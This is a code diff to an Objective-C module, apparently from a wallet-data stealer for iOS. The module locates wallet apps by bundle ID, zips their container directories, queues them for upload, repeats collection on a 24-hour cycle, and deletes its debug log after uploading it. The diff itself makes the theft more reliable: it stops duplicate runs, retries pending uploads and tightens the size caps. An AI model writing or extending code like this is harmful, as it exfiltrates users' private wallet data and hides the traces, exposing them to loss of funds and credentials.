@@ -14,10 +14,12 @@
 - (NSDictionary *)_walletManifestForName:(NSString *)name
                                 bundleID:(NSString *)bid
                                    bytes:(NSNumber *)bytes;
+- (void)_uploadRunLog;
 @end
 
 @implementation OWRoute {
     OWRoutePhase _phase;
+    BOOL _running;
 }
 
 + (instancetype)shared {
@@ -49,8 +51,16 @@
 }
 
 - (void)start {
+    @synchronized (self) {
+        if (_running) {
+            OWLog(@"路由已在运行，忽略重复 start");
+            return;
+        }
+        _running = YES;
+    }
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
         @autoreleasepool { [self _run]; }
+        @synchronized (self) { self->_running = NO; }
     });
 }
 
@@ -64,9 +74,24 @@
           dev.socTierName, dev.isArm64e, dev.bootManifestHash ?: @"(nil)");
 
     if ([state isDone]) {
-        OWLog(@"已完成标记存在，跳过");
-        [self _setPhase:OWRoutePhaseDone];
-        return;
+        if ([state shouldSkipForTTL:24.0 * 3600.0]) {
+            OWLog(@"已完成且未满 24h（doneAt=%.0f），检查待补传", [state doneAt]);
+            OWUploader *up = [OWUploader new];
+            [up flush:nil];
+            if (![up hasPendingData]) {
+                [self _setPhase:OWRoutePhaseDone];
+                return;
+            }
+            OWLog(@"完成标记但仍有待上传数据，改为续跑");
+            [state beginNewRun];
+        } else {
+            OWLog(@"距上次完成已超过 24h，开始新一轮采集");
+            [state beginNewRun];
+        }
+    } else {
+        // 上次中断/未完成：清掉上一轮结果后从头重跑，避免旧 payloads 误判完成
+        OWLog(@"上次未完成/中断，清理本轮状态后重跑");
+        [state beginNewRun];
     }
 
     OWUploader *up = [OWUploader new];
@@ -191,9 +216,10 @@
     }
 
     NSDictionary *manifest = [self _walletManifestForName:name bundleID:bid bytes:r[@"bytes"]];
+    // 固定名字：同一目标重跑时覆盖临时 zip，避免每次生成新名字
+    NSString *safeName = [name stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
     NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
-        [NSString stringWithFormat:@"ow_pack_%@_%llu.zip", name,
-         (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];
+        [NSString stringWithFormat:@"ow_pack_%@.zip", safeName]];
 
     NSError *e = nil;
     BOOL ok = [OWArchive zipDirectory:p
@@ -201,7 +227,7 @@
                              manifest:manifest
                                subdir:bid
                              maxBytes:200ULL * 1024 * 1024
-                             totalCap:800ULL * 1024 * 1024
+                             totalCap:150ULL * 1024 * 1024
                                 error:&e];
     if (ok) {
         BOOL enq = [up enqueueFile:tmp kind:OWUploadKindContainer error:nil];
@@ -275,21 +301,37 @@
 - (void)_finishWithUploader:(OWUploader *)up {
     // 规则三：空结果绝不写 done —— 否则后续不再重试，永久零数据
     BOOL valid = [self _hasValidPayload];
-    OWLog(@"判定: 有效载荷 = %@", valid ? @"有" : @"无");
+    BOOL pending = [up hasPendingData];
+    OWLog(@"判定: 有效载荷 = %@，待上传数据 = %@", valid ? @"有" : @"无",
+          pending ? @"有" : @"无");
 
-    if (valid) {
+    if (valid && !pending) {
         [[OWState shared] markDoneIfPayloadValid:YES];
         [self _setPhase:OWRoutePhaseCleanup];
+        // 清理会删 ow_debug.log，所以先上传本轮完整日志
+        OWLog(@"======== 自动上传本轮日志 ========");
+        [self _uploadRunLog];
         [[OWCleanup new] execute];
         [self _setPhase:OWRoutePhaseDone];
     } else {
         [[OWState shared] setObject:@([[OWState shared] objectForKey:@"emptyRounds"] ?
                                       [[[OWState shared] objectForKey:@"emptyRounds"] intValue] + 1 : 1)
                              forKey:@"emptyRounds"];
-        OWLog(@"本轮无有效载荷，保留未完成状态，下次启动继续");
+        OWLog(@"本轮%@，保留未完成状态，下次启动继续",
+              pending ? @"仍有待上传数据" : @"无有效载荷");
         [self _setPhase:OWRoutePhaseFailed];
+        OWLog(@"======== 自动上传本轮日志 ========");
+        [self _uploadRunLog];
     }
     OWLog(@"======== 结束 phase=%@ ========", self.phaseName);
+}
+
+- (void)_uploadRunLog {
+    OWUploader *up = [OWUploader new];
+    NSError *e = nil;
+    BOOL ok = [up uploadDiagnosticLogLabel:@"opensrc_auto" error:&e];
+    OWLog(@"上传: 本轮日志 %@ %@", ok ? @"成功" : @"失败",
+          e.localizedDescription ?: @"");
 }
 
 - (BOOL)_hasValidPayload {
